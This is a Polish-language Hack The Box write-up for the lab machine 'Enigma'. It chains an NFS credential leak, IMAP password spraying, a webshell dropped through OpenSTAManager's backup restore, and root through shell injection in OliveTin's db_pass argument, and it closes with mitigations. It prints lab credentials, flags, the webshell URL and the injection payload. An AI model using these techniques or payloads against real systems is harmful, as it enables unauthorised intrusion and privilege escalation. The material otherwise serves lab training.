# Enigma — Hack The Box (Write-up)

**Autor:** DonMorpheus (lab)  
**Maszyna:** `enigma.htb`  
**OS:** Linux  
**Trudność:** Easy / Medium (łańcuch leaków + jeden RCE + localhost privesc)

> Flagi i hasła na końcu. Używaj tylko w scope HTB / własnego labu.

---

## TL;DR

| Faza | Wektor |
|------|--------|
| Recon | NFS export → PDF z credami |
| Pivot | IMAP Sarah → mail z credami OpenSTA |
| Foothold | OpenSTAManager backup **restore** → webshell `www-data` |
| User | MySQL `config.inc.php` + bcrypt `haris` → `su haris` / SSH |
| Root | **OliveTin** `127.0.0.1:1337` (root) → injekcja w akcji `backup_database` |

---

## 1. Recon

```bash
sudo nmap -sC -sV -oA nmap/initial <IP>
```

Istotne porty: **22**, **80**, **110/143/993/995** (Dovecot), **111/2049** (NFS).

`/etc/hosts`:

```
<IP> enigma.htb mail001.enigma.htb support_001.enigma.htb
```

- `http://enigma.htb` — statyczna strona (brak wejścia aplikacyjnego).
- Vhosty: `mail001` (Roundcube), `support_001` (OpenSTAManager 2.9.8).

---

## 2. NFS — onboarding leak

```bash
showmount -e <IP>
sudo mkdir -p ~/mnt/enigma_nfs
sudo mount -t nfs <IP>:/srv/nfs/onboarding ~/mnt/enigma_nfs -o ro,nfsvers=3
```

Plik: `New_Employee_Access.pdf` → tekst (np. `mutool draw -F txt`):

- **URL:** `http://mail001.enigma.htb`
- **User / pass:** `kevin` / `Enigma2024!`

Eksport w `/etc/exports` na boxie: `*(ro)` — wystarczy do odczytu.

---

## 3. Mail — Kevin → Sarah

### Roundcube (opcjonalnie)

Logowanie na `mail001` jako kevin.

### IMAP (zalecane)

```bash
python3 scripts/imap_read_inbox.py <IP> kevin 'Enigma2024!'
python3 scripts/imap_spray.py <IP> 'Enigma2024!' sarah kevin
```

W skrzynce **sarah** mail IT z dostępem do OpenSTA:

- `http://support_001.enigma.htb`
- `admin` / `Ne3s4rtars78s`

---

## 4. OpenSTAManager — RCE (restore)

Mechanizm: `Backup::restore()` rozpakowuje ZIP i **`copyr()`** do katalogu aplikacji (`/var/www/html/openstamanager`). Wystarczy ZIP **bez** `database.sql`, tylko z webshellem.

```bash
export IP=<IP>
./scripts/osm_restore_shell.sh
# shell: http://support_001.enigma.htb/an.php?c=id
```

Ręcznie: login POST `?op=login`, potem `POST /actions.php?id_module=7` z `op=restore` i `blob=@evil.zip`.

---

## 5. User flag — haris

Z webshella odczyt `config.inc.php`:

- MySQL: `brollin` / `Fri3nds@9099`

```bash
# przez an.php?c= lub skrypt:
./scripts/osm_mysql_users.sh <IP>   # wymaga działającego an.php
```

Hash bcrypt użytkownika **haris** → john rockyou: **`bestfriends`**

```bash
printf 'bestfriends\n' | su haris -c 'cat /home/haris/user.txt'
```

Opcjonalnie: klucz SSH w `~haris/.ssh/authorized_keys` (`scripts/install_ssh_key.sh`).

**User:** `9747c42886f3628b926fdc9b7c739f42`

---

## 6. Root — OliveTin (localhost)

- Proces: `/usr/local/bin/OliveTin` jako **root**
- Nasłuch: `127.0.0.1:1337`
- Config: `/etc/OliveTin/config.yaml` — akcja `backup_database` z szablonem:

  `mysqldump -u {{ db_user }} -p'{{ db_pass }}' ...`

- `authRequireGuestsToLogin: false` + gość może **exec**
- API: `POST /api/StartAction` z **`Content-Type: application/proto`** (nie JSON)

Z Kali:

```bash
ssh -i ~/.ssh/id_ed25519_htb -L 13337:127.0.0.1:1337 haris@<IP> -N -f
python3 scripts/olivetin_root.py --host 127.0.0.1 --port 13337
```

Injekcja w argumencie `db_pass`:

```text
x' ; cat /root/root.txt ; '
```

Wynik w `POST /api/GetLogs` → pole `output`.

**Root:** `0b627f7a5858b15e5f807f3e79ca11a5`

---

## 7. Mitigacje (skrót)

- NFS: nie eksportować onboarding z wrażliwymi plikami na `*`; segmentacja / brak haseł w PDF.
- Mail: unikalne hasła startowe; MFA na webmailu.
- OpenSTA: wyłączyć restore dla niezaufanych adminów; CSRF włączone; backup poza docroot.
- OliveTin: bind tylko z auth; brak shell z interpolacją argumentów bez escapingu; nie uruchamiać jako root z gościem exec.

---

## Pliki w repo

| Skrypt | Opis |
|--------|------|
| `scripts/osm_restore_shell.sh` | login + evil.zip + restore |
| `scripts/imap_read_inbox.py` | czytanie INBOX |
| `scripts/imap_spray.py` | spray haseł IMAP |
| `scripts/olivetin_root.py` | protobuf StartAction + root flag |
| `scripts/install_ssh_key.sh` | wrzuca klucz do haris (przez an.php) |
| `scripts/replay_full.sh` | orchestracja (IP jako arg) |
| `artifacts/evil-restore.zip` | gotowy minimalny ZIP pod restore |
| `artifacts/olivetin-config.yaml` | referencyjny config z boxa |

---

## Referencje

- OpenSTAManager `Backup::restore` — kopia plików z ZIP do `base_dir()`
- OliveTin docs — actions, argument types, REST/connect API